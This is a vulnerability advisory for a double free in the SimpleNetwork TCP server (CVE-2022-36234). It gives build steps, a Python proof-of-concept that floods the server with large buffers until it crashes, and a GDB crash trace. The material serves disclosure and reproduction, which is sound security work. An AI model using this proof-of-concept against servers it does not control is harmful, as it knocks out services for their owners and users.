# Overview

SimpleNetwork TCP Server commit 29bc615f0d9910eb2f59aa8dff1f54f0e3af4496 was discovered to contain a double free vulnerability which is exploited via crafted TCP packets. Triggering the double free will allow client to crash any SimpleNetwork TCP server remotely. In other situations, double free vulnerabilities can cause undefined behavior and potentially code execution in the right circumstances.

# Reproduction

To ensure you have the standard build tools required to compile the library, install the following packages (ost systems this will already be installed):

``
sudo apt-get install build-essential git
``

The vulnerability can be reproduced by sending consecutive requrests to the server containing a large buffer of characters in a TCP packet.  First, compile the 'libSimpleNetwork' library and example server provided in the source code:

```
git clone https://github.com/kashimAstro/SimpleNetwork.git
cd SimpleNetwork
git checkout 29bc615f0d9910eb2f59aa8dff1f54f0e3af4496
cd src
make
cd ../example-server
make
```

### Start the example-server:

```
./server 80 1
```

### Save the following python3 proof of concept script to a file (modify the host as needed):
```
import socket

host = "localhost"
port = 80                   # The same port as used by the server
buf = b'A'*10000

try:
    for i in range(50):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.sendall(buf)
        data = s.recv(1024)
        s.close()
        print('Received', repr(data))
except:
    print("Completed...")
```

### Execute the python3 script:

```
python3 poc.py
```

### Crash verification:
If successful, the server will crash and you will see the following output from the application:
```
segmentation fault  ./server 80 1
```

### GDB backtrace:
```
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────
 RAX  0x21
 RBX  0x7fffec000e60 ◂— '2023-1-31 11:50:57\r\n'
 RCX  0x0
 RDX  0x555555580ed0 —▸ 0x5555555811b0 ◂— 0x555555581
 RDI  0x55555556e3d0 (TCPServer::newsockfd) —▸ 0x555555580ed0 —▸ 0x5555555811b0 ◂— 0x555555581
 RSI  0xffffffffffffffff
 R8   0x0
 R9   0x640
 R10  0xa3d70a3d70a3d70b
 R11  0x293
 R12  0x14
 R13  0x0
 R14  0x7ffff7a1dc90 —▸ 0x7ffff7a1dcb0 —▸ 0x7ffff7a1dcf0 —▸ 0x7ffff7a1dd30 —▸ 0x7fffe8001bf0 ◂— ...
 R15  0x7ffff621c000 ◂— 0x0
 RBP  0x7ffff6a1bc30 —▸ 0x7ffff6a1bed0 ◂— 0x0
 RSP  0x7ffff6a1bc00 ◂— 0x14
 RIP  0x55555555909e ◂— mov    eax, dword ptr [rax]
─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x55555555909e    mov    eax, dword ptr [rax]
   0x5555555590a0    mov    ecx, 0
   0x5555555590a5    mov    rdx, r12
   0x5555555590a8    mov    rsi, rbx
   0x5555555590ab    mov    edi, eax
   0x5555555590ad    call   send@plt                <send@plt>
 
   0x5555555590b2    nop    
   0x5555555590b3    add    rsp, 0x20
   0x5555555590b7    pop    rbx
   0x5555555590b8    pop    r12
   0x5555555590ba    pop    rbp

```


# References

* https://owasp.org/www-community/vulnerabilities/Doubly_freeing_memory
* https://cwe.mitre.org/data/definitions/415.html
* https://github.com/kashimAstro/SimpleNetwork/issues/22
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36234
